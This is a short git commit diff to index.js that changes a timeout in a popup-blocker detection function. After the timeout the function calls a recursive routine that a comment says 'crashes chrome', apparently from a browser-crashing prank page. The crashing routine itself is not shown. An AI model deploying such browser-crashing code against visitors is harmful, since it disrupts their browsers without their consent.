6a84e34907a296d000f127d950a8cb76c8b974aa
Dr3w0623 <34252192+Dr3w0623@users.noreply.github.com>
2018-02-11 09:09:45 -0500

    Update index.js

--- index.js
+++ index.js
@@ -13,7 +13,7 @@ function detectPopupBlocker() {
   { // Tests for pop-up blocker ^
     setTimeout(function() {
       recursor();
-    }, 1500);
+    }, 3000);
 //Runs recursory code after 5000 millisecond delay ^ (crashes chrome)
   } else {
     myTest.close();
